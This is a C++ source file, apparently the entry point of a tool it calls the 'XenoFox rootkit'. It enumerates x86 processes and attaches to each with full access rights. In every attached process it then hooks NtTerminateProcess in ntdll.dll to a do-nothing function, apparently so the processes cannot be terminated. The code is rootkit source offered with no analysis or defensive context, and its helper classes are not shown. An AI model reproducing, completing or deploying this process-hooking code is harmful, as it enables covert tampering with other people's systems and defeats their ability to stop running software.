#include "includes.h"

CSystem os;
CProcess process;
CLog dbg;
CDisasm disasm;
CHook hook;
CException exception;

void __exit(UINT uExitCode);

void dummy() {

}

int main()
{
	printf("Press any key to start XenoFox rootkit ...\n\n");
	
	// getchar();
	
	printf(" + Scanning for x86 processes ...\n");
	
	// Scan for a vulnerable x86 process
	std::vector<PROCESSENTRY32W> processes = process.walk_processes();

	if (processes.size() == 0)
	{
		dbg.print(LOG_FAILED, " - No x86 processes available.\n");
		__exit(ERROR_X86_PROCESS_NOT_FOUND);
	}

	dbg.print(LOG_SUCCESS, " + Found %d compatible x86 processes.\n", processes.size());

	for (auto &x : processes)
	{
		if (process.attach(x.th32ProcessID, PROCESS_ALL_ACCESS, nullptr, true))
			dbg.print(LOG_SUCCESS, "   => Attached to %ls (%d)\n", x.szExeFile, x.th32ProcessID);
	}

	hook.init_space(1);

	for (auto &x : process.get_attached_processes())
	{
		hook.set_hook(x, (void*)&dummy, "NtTerminateProcess", "ntdll.dll");
	}

	getchar();

	return 0;
}

void __exit(UINT uExitCode)
{
	printf("Exiting ...\n");
	
	process.release();

	TerminateProcess((HANDLE)-1, uExitCode);
}

void assert(bool condition, const char *exception)
{
	if (!condition)
		throw exception;
}